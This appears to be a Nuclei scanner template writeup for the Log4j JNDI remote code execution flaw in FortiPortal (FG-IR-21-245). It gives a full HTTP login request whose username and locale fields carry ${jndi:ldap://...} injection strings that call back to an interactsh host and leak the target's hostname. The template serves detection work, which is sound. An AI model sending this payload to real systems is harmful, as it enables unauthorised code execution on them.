# Nuclei Template: FortiPortal - Remote Code Execution (Apache Log4j)
**Template ID:** fortiportal-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`fortiportal-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
FortiPortal is susceptible to Log4j JNDI remote code execution. FortiPortal provides comprehensive security management and analytics within a multi-tenant, multi-tier management framework.

## Steps to reproduce / Exploit Payload
```http
POST /fpc/login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Accept: application/json, text/plain, */*
Referer: {{RootURL}}/fpc/app/login
Content-Type: application/json

{"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}","password":"{{str}}","isAdmin":false,"locale":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
```

## References
- https://www.fortiguard.com/psirt/FG-IR-21-245
